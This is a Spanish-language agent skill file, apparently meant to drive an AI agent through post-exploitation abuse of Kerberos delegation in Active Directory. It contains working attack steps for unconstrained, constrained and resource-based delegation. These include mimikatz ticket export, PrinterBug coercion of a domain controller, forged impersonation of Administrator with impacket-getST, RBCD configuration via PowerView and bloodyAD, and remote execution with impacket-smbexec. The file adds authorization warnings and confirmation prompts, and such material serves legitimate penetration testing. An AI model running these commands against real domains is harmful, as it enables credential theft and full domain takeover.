---
name: ad-kerberos-delegation
description: Abusar delegacion Kerberos — Unconstrained, Constrained, y Resource-Based Constrained Delegation (RBCD)
phase: post
---

# AD Kerberos Delegation Abuse

## Activation Contract

**Cuando se usa:** Post-explotacion para escalar privilegios via delegacion Kerberos mal configurada. Requiere acceso a un objeto AD con un Service Principal Name (SPN) que tenga delegacion habilitada.

**Input requerido:**
- `domain`: dominio
- `dc_ip`: IP del Domain Controller
- `target_computer`: computadora con delegacion habilitada
- `delegation_type`: Unconstrained | Constrained | RBCD
- `impersonate_user`: usuario a impersonar (default: Administrator)
- `target_service`: SPN del servicio objetivo (Constrained/RBCD)

**Herramientas:** impacket-getST, Rubeus, PowerView, mimikatz, bloodyAD

## Hard Rules

1. NO abusar delegacion sin autorizacion — puede comprometer el dominio entero
2. Unconstrained delegation permite robar TGTs de cualquier usuario que se autentique al servidor
3. Constrained delegation permite impersonar usuarios SOLO para servicios especificos
4. RBCD es la mas flexible: permite configurar quien puede delegar en quien
5. Los tickets delegados tienen vida util limitada (usualmente 10 horas)
6. Unconstrained delegation requiere acceso fisico o admin en el servidor delegado
7. RBCD requiere permisos de escritura en el objeto target (GenericWrite, WriteProperty)

## Decision Gates

Preguntar antes de cada accion:

- **Explotar Unconstrained**: "Host `<target>` tiene delegacion sin restricciones. Podemos robar TGTs de cualquier usuario que se conecte. ?Proceder?"
- **Explotar Constrained**: "Host `<target>` puede delegar a `<service>`. Impersonaremos `<user>`. ?Continuar?"
- **Configurar RBCD**: "Configurar RBCD en `<target>` para permitir delegacion desde nuestra computadora. Requiere permisos de escritura. ?Autorizado?"
- **Impersonar DA**: "Vamos a impersonar a Domain Admin `<user>`. ?Ejecutar?"

## Execution Steps

### 1. Enumerar delegacion

```powershell
# PowerView: buscar computadoras con delegacion
Get-NetComputer -Unconstrained -Properties dnshostname, samaccountname
Get-NetComputer -TrustedToAuth -Properties dnshostname, samaccountname
Get-DomainObject -LDAPFilter "(&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*))"

# Listar RBCD
Get-DomainComputer -LDAPFilter "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" -Properties dnshostname
```

```bash
# impacket: enumerar cuentas con delegacion
impacket-findDelegation <domain>/<user>:<pass>@<dc_ip>
```

### 2. Unconstrained Delegation — TGT theft

```bash
# En el servidor con delegacion sin restricciones:
# Esperar a que un admin se autentique (o coercionar)

# mimikatz: extraer TGTs de la memoria
mimikatz "privilege::debug" "sekurlsa::tickets /export" exit

# Si se coercion al DC a autenticarse:
python3 PrinterBug.py <dc_ip> <unconstrained_server_ip>
# Luego extraer TGT del DC de la memoria del servidor
```

```powershell
# Rubeus: monitorear tickets nuevos
Rubeus.exe monitor /targetuser:<admin_user> /interval:5
```

### 3. Constrained Delegation — Service impersonation

```bash
# Obtener TGT del usuario actual con el hash
impacket-getTGT <domain>/<user>:<pass> -dc-ip <dc_ip>

# Solicitar ST para el servicio delegado impersonando al admin
impacket-getST -k -impersonate <admin_user> \
  -spn <service_spn>/<target_hostname> \
  <domain>/<user> -dc-ip <dc_ip>

export KRB5CCNAME=<admin_user>.ccache

# Acceder al servicio
impacket-smbexec <domain>/<admin_user>@<target_hostname> -k -no-pass
```

### 4. RBCD — Resource-Based Constrained Delegation

```bash
# Requisito: permisos de escritura en la computadora target
# Obtener SID de nuestra computadora controlada
```

```powershell
# PowerView: configurar RBCD
$rsd = Get-DomainComputer <our_computer> -Properties objectsid
Set-DomainObject -Identity <target_computer> -Set @{
  'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsd.objectsid
}
```

```bash
# Agregar delegacion usando nuestro SID
bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> \
  set rbcd <target_computer> <our_computer>

# Solicitar ticket impersonando admin
impacket-getST -k -impersonate <admin_user> \
  -spn cifs/<target_hostname> \
  <domain>/<our_computer$> -dc-ip <dc_ip>

export KRB5CCNAME=<admin_user>.ccache
impacket-smbexec <domain>/<admin_user>@<target_hostname> -k -no-pass
```

### 5. Cleanup — Remover RBCD

```bash
# Remover la delegacion configurada
bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> \
  remove rbcd <target_computer> <our_computer>
```

## Output Contract

```json
{
  "skill": "ad-kerberos-delegation",
  "phase": "post",
  "domain": "domain.local",
  "delegation_type": "RBCD",
  "target_computer": "DC01",
  "our_computer": "HACKER01",
  "impersonated_user": "Administrator",
  "service_accessed": "cifs/dc01.domain.local",
  "ticket_file": "/tmp/Administrator.ccache",
  "rbc_configured": true,
  "rbc_removed": true,
  "commands_executed": [
    "bloodyAD set rbcd DC01 HACKER01",
    "impacket-getST -k -impersonate Administrator -spn cifs/DC01.domain.local domain/HACKER01$"
  ],
  "access_gained": ["SYSVOL", "C$"],
  "detection_risk": "high"
}
```
